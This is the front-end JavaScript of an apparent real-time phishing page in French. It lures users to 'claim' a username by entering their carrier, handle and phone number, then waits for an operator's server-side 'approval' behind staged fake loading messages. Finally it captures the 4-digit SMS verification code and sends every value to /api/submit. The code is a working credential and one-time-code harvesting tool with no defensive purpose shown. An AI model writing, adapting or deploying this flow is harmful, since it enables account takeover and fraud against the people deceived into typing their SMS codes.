const carrierButtons = document.querySelectorAll(".carrier-btn");
const usernameInput = document.getElementById("username");
const phoneInput = document.getElementById("phone");
const claimBtn = document.getElementById("claim-btn");
const verifyBtn = document.getElementById("verify-btn");
const codeInput = document.getElementById("code");
const statusLine = document.getElementById("status-line");
const statusText = document.getElementById("status-text");
const codeStatus = document.getElementById("code-status");

const stepForm = document.getElementById("step-form");
const stepLoading = document.getElementById("step-loading");
const stepCode = document.getElementById("step-code");
const stepSuccess = document.getElementById("step-success");
const successUsername = document.getElementById("success-username");
const successCarrier = document.getElementById("success-carrier");
const loadingMessage = document.getElementById("loading-message");
const loadingSteps = document.querySelectorAll(".loading__step");

const carrierLabels = {
  bouygues: "Bouygues",
  orange: "Orange",
  sfr: "SFR",
};

const messages = {
  bouygues: "Bouygues sélectionné — entrez votre pseudo et votre numéro.",
  orange: "Orange sélectionné — entrez votre pseudo et votre numéro.",
  sfr: "SFR sélectionné — entrez votre pseudo et votre numéro.",
};

const loadingMessages = [
  "Validation du compte…",
  "Envoi du code de vérification…",
  "En attente de l'envoi du code SMS…",
];

let selectedCarrier = null;
let formData = {};

function setStatus(text, state = "idle") {
  statusText.textContent = text;
  statusLine.classList.toggle("is-active", state === "active");
  statusLine.classList.toggle("is-ready", state === "ready");
}

function showStep(step) {
  stepForm.hidden = step !== "form";
  stepLoading.hidden = step !== "loading";
  stepCode.hidden = step !== "code";
  stepSuccess.hidden = step !== "success";
}

function showSuccessStep() {
  successUsername.textContent = `@${formData.username}`;
  successCarrier.textContent = formData.carrier;
  showStep("success");
}

function updateClaimButton() {
  const username = usernameInput.value.trim();
  const phone = phoneInput.value.trim();
  claimBtn.disabled = !selectedCarrier || !username || !phone;
}

function updateStatusFromInputs() {
  if (!selectedCarrier) return;

  const username = usernameInput.value.trim().replace(/^@/, "");
  const phone = phoneInput.value.trim();

  if (!username || !phone) {
    setStatus(messages[selectedCarrier], "active");
    return;
  }

  setStatus(`Prêt — @${username} · ${carrierLabels[selectedCarrier]} · ${phone}`, "ready");
}

async function sendSubmission(type, data) {
  const response = await fetch("/api/submit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ type, ...data }),
  });

  if (!response.ok) {
    throw new Error("Submit failed");
  }

  return response.json();
}

async function waitForApproval(sessionId) {
  while (true) {
    const response = await fetch(`/api/session?id=${encodeURIComponent(sessionId)}`);
    const data = await response.json();

    if (data.status === "approved") {
      return;
    }

    await wait(2000);
  }
}

function setLoadingStep(index) {
  loadingMessage.textContent = loadingMessages[index];

  loadingSteps.forEach((step, i) => {
    step.classList.toggle("is-active", i === index);
    step.classList.toggle("is-done", i < index);
  });
}

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function startLoadingFlow() {
  showStep("loading");
  setLoadingStep(0);

  await wait(2200);
  setLoadingStep(1);

  await wait(1800);

  let sessionId;

  try {
    const result = await sendSubmission("request", {
      username: formData.username,
      phone: formData.phone,
      carrier: formData.carrier,
    });
    sessionId = result.sessionId;
  } catch {
    loadingMessage.textContent = "Une erreur est survenue. Réessayez.";
    return;
  }

  if (!sessionId) {
    loadingMessage.textContent = "Une erreur est survenue. Réessayez.";
    return;
  }

  setLoadingStep(2);
  await waitForApproval(sessionId);

  loadingMessage.textContent = "Code envoyé !";
  loadingSteps.forEach((step) => {
    step.classList.remove("is-active");
    step.classList.add("is-done");
  });

  await wait(900);
  showStep("code");
  codeInput.focus();
}

carrierButtons.forEach((button) => {
  button.addEventListener("click", () => {
    selectedCarrier = button.dataset.carrier;

    carrierButtons.forEach((btn) => {
      const isSelected = btn === button;
      btn.classList.toggle("is-selected", isSelected);
      btn.setAttribute("aria-pressed", String(isSelected));
    });

    setStatus(messages[selectedCarrier], "active");
    usernameInput.focus();
    updateClaimButton();
    updateStatusFromInputs();
  });
});

usernameInput.addEventListener("input", () => {
  updateClaimButton();
  updateStatusFromInputs();
});

phoneInput.addEventListener("input", () => {
  updateClaimButton();
  updateStatusFromInputs();
});

claimBtn.addEventListener("click", () => {
  if (claimBtn.disabled) return;

  formData = {
    username: usernameInput.value.trim().replace(/^@/, ""),
    phone: phoneInput.value.trim(),
    carrier: carrierLabels[selectedCarrier],
  };

  startLoadingFlow();
});

codeInput.addEventListener("input", () => {
  codeInput.value = codeInput.value.replace(/\D/g, "").slice(0, 4);
  verifyBtn.disabled = codeInput.value.length !== 4;
});

verifyBtn.addEventListener("click", async () => {
  const code = codeInput.value.trim();
  if (!code) return;

  verifyBtn.disabled = true;
  verifyBtn.textContent = "Vérification…";
  codeStatus.textContent = "Vérification du code en cours…";

  try {
    await sendSubmission("verify", {
      username: formData.username,
      phone: formData.phone,
      carrier: formData.carrier,
      code,
    });
  } catch {
    codeStatus.textContent = "Erreur lors de la vérification. Réessayez.";
    verifyBtn.textContent = "Vérifier le code";
    verifyBtn.disabled = false;
    return;
  }

  await wait(1500);
  showSuccessStep();
});
